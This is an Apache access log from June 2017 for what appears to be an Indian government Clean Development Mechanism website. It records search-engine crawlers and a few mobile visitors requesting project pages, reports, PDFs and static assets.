66.249.79.133 - - [10/Jun/2017:06:11:41 +0530] "GET /reports_list_details.php?id=Jharkhand&reporttype=2&page=1 HTTP/1.1" 200 21004 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.131 - - [10/Jun/2017:06:11:44 +0530] "GET /aboutus.php HTTP/1.1" 200 19599 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.98 - - [10/Jun/2017:06:12:15 +0530] "GET /registration.php HTTP/1.1" 302 28531 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.98 - - [10/Jun/2017:06:12:16 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.98 - - [10/Jun/2017:06:12:22 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.98 - - [10/Jun/2017:06:12:31 +0530] "GET /project_details_view_report.php?id=495 HTTP/1.1" 200 13156 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.98 - - [10/Jun/2017:06:13:53 +0530] "GET /registration.php HTTP/1.1" 302 28531 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.98 - - [10/Jun/2017:06:13:53 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.98 - - [10/Jun/2017:06:13:54 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
41.97.60.199 - - [10/Jun/2017:06:17:36 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.97.60.199 - - [10/Jun/2017:06:17:36 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
90.57.11.38 - - [10/Jun/2017:06:18:57 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Java/1.8.0_101"
66.249.79.131 - - [10/Jun/2017:06:19:03 +0530] "GET /project_details_view.php?id=2015&oid=&page=6&reporttype= HTTP/1.1" 200 15059 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.85 - - [10/Jun/2017:06:19:49 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.243 - - [10/Jun/2017:06:19:58 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
157.55.39.98 - - [10/Jun/2017:06:27:41 +0530] "GET /approval_process.php HTTP/1.1" 200 25914 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.133 - - [10/Jun/2017:06:29:13 +0530] "GET /project_details_view.php?id=1258&oid=&page=45&reporttype= HTTP/1.1" 200 14034 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.243 - - [10/Jun/2017:06:30:23 +0530] "GET /images/NCDMA%20PCN%20Format%2017072009.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
40.77.167.85 - - [10/Jun/2017:06:32:57 +0530] "GET /images/NCDMA%20PCN%20Format%2017072009.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.133 - - [10/Jun/2017:06:34:13 +0530] "GET /project_details_view.php?id=1149&oid=&page=52&reporttype= HTTP/1.1" 200 14138 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.140 - - [10/Jun/2017:06:34:19 +0530] "GET /project_details_view.php?id=760 HTTP/1.1" 200 14928 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
37.49.224.26 - - [10/Jun/2017:06:37:18 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; DTS Agent"
123.125.71.50 - - [10/Jun/2017:06:38:35 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
35.184.189.105 - - [10/Jun/2017:06:39:20 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.129 - - [10/Jun/2017:06:39:24 +0530] "GET /aboutus.php HTTP/1.1" 200 19599 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.85 - - [10/Jun/2017:06:39:46 +0530] "GET /project_details_view.php?id=1275 HTTP/1.1" 200 14334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
52.55.215.57 - - [10/Jun/2017:06:45:47 +0530] "GET / HTTP/1.1" 200 19482 "-" "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31"
40.77.167.85 - - [10/Jun/2017:06:45:58 +0530] "GET /future_projects.php HTTP/1.1" 302 26212 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:06:46:00 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:06:46:01 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.91 - - [10/Jun/2017:06:49:26 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.248 - - [10/Jun/2017:06:50:15 +0530] "GET /reports_new.php?n=1 HTTP/1.1" 200 22413 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
157.55.39.165 - - [10/Jun/2017:06:54:29 +0530] "GET /project_details_view.php?id=1411 HTTP/1.1" 200 15901 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.165 - - [10/Jun/2017:06:57:05 +0530] "GET /sitemap.php HTTP/1.1" 200 18471 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:06:57:46 +0530] "GET /news_more.php HTTP/1.1" 200 21063 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.165 - - [10/Jun/2017:06:58:10 +0530] "GET /capacity_building.php HTTP/1.1" 200 19188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
47.29.67.116 - - [10/Jun/2017:06:59:00 +0530] "GET /project_details_view.php?id=914 HTTP/1.1" 200 14411 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:01 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:01 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:01 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:03 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:03 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:03 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:03 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:03 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:03 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:04 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:04 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:04 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:04 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
47.29.67.116 - - [10/Jun/2017:06:59:07 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/project_details_view.php?id=914" "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo K33a42 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
54.173.165.103 - - [10/Jun/2017:06:59:31 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring"
66.249.79.91 - - [10/Jun/2017:06:59:53 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
199.30.25.211 - - [10/Jun/2017:07:01:38 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
157.55.39.98 - - [10/Jun/2017:07:03:21 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.131 - - [10/Jun/2017:07:04:46 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=99 HTTP/1.1" 200 21914 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.156 - - [10/Jun/2017:07:05:12 +0530] "GET /images/h_news.jpg HTTP/1.1" 200 21315 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.98 - - [10/Jun/2017:07:08:44 +0530] "GET /contactus.php HTTP/1.1" 200 18294 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.131 - - [10/Jun/2017:07:09:43 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=94 HTTP/1.1" 200 22066 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.98 - - [10/Jun/2017:07:10:20 +0530] "GET /downloads/Existing%20PCN.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.165 - - [10/Jun/2017:07:11:31 +0530] "GET /detail_news.php?id=18 HTTP/1.1" 302 18715 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.165 - - [10/Jun/2017:07:11:31 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.165 - - [10/Jun/2017:07:11:32 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:07:18:16 +0530] "GET /project_details_view.php?id=1214 HTTP/1.1" 200 14465 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
168.235.194.73 - - [10/Jun/2017:07:18:22 +0530] "GET /uploads/1209688187PDD_NFL_Steam_Optimization_Bathinda_2012-10-29.pdf HTTP/1.1" 200 843398 "https://www.google.co.in/search?q=steam+generayion+in+nfl+bathinda&client=ucweb-b&channel=sb" "Mozilla/5.0 (Linux; U; Android 7.0; en-US; Moto G (4) Build/NPJS25.93-14-4) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.2.960 U3/0.8.0 Mobile Safari/534.30"
169.149.128.5 - - [10/Jun/2017:07:18:24 +0530] "GET /uploads/1209688187PDD_NFL_Steam_Optimization_Bathinda_2012-10-29.pdf HTTP/1.1" 206 843398 "https://www.google.co.in/search?q=steam+generayion+in+nfl+bathinda&client=ucweb-b&channel=sb" "Mozilla/5.0 (Linux; U; Android 7.0; en-US; Moto G (4) Build/NPJS25.93-14-4) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.2.960 U3/0.8.0 Mobile Safari/534.30"
169.149.128.5 - - [10/Jun/2017:07:18:26 +0530] "GET /uploads/1209688187PDD_NFL_Steam_Optimization_Bathinda_2012-10-29.pdf HTTP/1.1" 206 281132 "https://www.google.co.in/search?q=steam+generayion+in+nfl+bathinda&client=ucweb-b&channel=sb" "Mozilla/5.0 (Linux; U; Android 7.0; en-US; Moto G (4) Build/NPJS25.93-14-4) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.2.960 U3/0.8.0 Mobile Safari/534.30"
66.249.79.129 - - [10/Jun/2017:07:20:49 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=150 HTTP/1.1" 200 22137 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.98 - - [10/Jun/2017:07:21:04 +0530] "GET /approved_projects.php HTTP/1.1" 200 16644 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
35.184.189.105 - - [10/Jun/2017:07:24:38 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.133 - - [10/Jun/2017:07:24:54 +0530] "GET /reports_list_details.php?id=Small&reporttype=4&page=163 HTTP/1.1" 200 22159 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
199.30.24.30 - - [10/Jun/2017:07:25:10 +0530] "GET /js/jquery.js HTTP/1.1" 200 55774 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.25.226 - - [10/Jun/2017:07:25:12 +0530] "GET /js/datepicker/latest_date.js HTTP/1.1" 200 11986 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.25.148 - - [10/Jun/2017:07:25:13 +0530] "GET /js/datepicker/latest_jquery.datePicker.js HTTP/1.1" 200 37423 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.25.149 - - [10/Jun/2017:07:25:14 +0530] "GET /js/datepicker/latest_datepicker.css HTTP/1.1" 200 2283 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.24.123 - - [10/Jun/2017:07:25:15 +0530] "GET /js/datepicker/latest_demo.css HTTP/1.1" 200 574 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
157.55.39.165 - - [10/Jun/2017:07:26:27 +0530] "GET /imp_links.php HTTP/1.1" 200 17836 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.98 - - [10/Jun/2017:07:28:41 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.165 - - [10/Jun/2017:07:29:45 +0530] "GET /aboutus.php HTTP/1.1" 200 19599 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
68.180.228.167 - - [10/Jun/2017:07:32:28 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
68.180.228.167 - - [10/Jun/2017:07:32:29 +0530] "GET /detail_news.php?id=19 HTTP/1.1" 302 19084 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
68.180.228.167 - - [10/Jun/2017:07:32:42 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
68.180.228.167 - - [10/Jun/2017:07:32:52 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
68.180.228.167 - - [10/Jun/2017:07:33:00 +0530] "GET /images/midbanner.swf HTTP/1.1" 304 - "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
66.249.79.131 - - [10/Jun/2017:07:35:04 +0530] "GET /project_details_view.php?id=930 HTTP/1.1" 200 16546 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.165 - - [10/Jun/2017:07:36:53 +0530] "GET /detail_events.php?id= HTTP/1.1" 302 16740 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.165 - - [10/Jun/2017:07:36:54 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.165 - - [10/Jun/2017:07:36:55 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:07:38:54 +0530] "GET /images/h_contactus.jpg HTTP/1.1" 200 21787 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:07:39:29 +0530] "GET /detail_news.php?id=20 HTTP/1.1" 302 18268 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:07:39:30 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:07:39:31 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
35.184.189.105 - - [10/Jun/2017:07:43:12 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.133 - - [10/Jun/2017:07:45:25 +0530] "GET /project_details_view.php?id=1466&oid=&page=16&reporttype= HTTP/1.1" 200 14502 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.98 - - [10/Jun/2017:07:48:09 +0530] "GET /reports_list_details.php?id=Punjab&reporttype=2 HTTP/1.1" 200 21607 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
199.30.24.203 - - [10/Jun/2017:07:48:11 +0530] "GET /js/user_registration.js HTTP/1.1" 200 26819 "http://www.cdmindia.gov.in/reports_list_details.php?id=Punjab&reporttype=2" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
157.55.39.156 - - [10/Jun/2017:07:49:56 +0530] "GET /reports_new.php?page= HTTP/1.1" 200 22797 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.129 - - [10/Jun/2017:07:50:23 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [10/Jun/2017:07:51:29 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
64.233.173.137 - - [10/Jun/2017:07:53:39 +0530] "GET /project_details_view.php?id=266 HTTP/1.1" 200 14175 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.137 - - [10/Jun/2017:07:53:40 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [10/Jun/2017:07:53:40 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [10/Jun/2017:07:53:40 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [10/Jun/2017:07:53:40 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [10/Jun/2017:07:53:40 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [10/Jun/2017:07:53:40 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [10/Jun/2017:07:53:40 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.137 - - [10/Jun/2017:07:53:40 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [10/Jun/2017:07:53:40 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
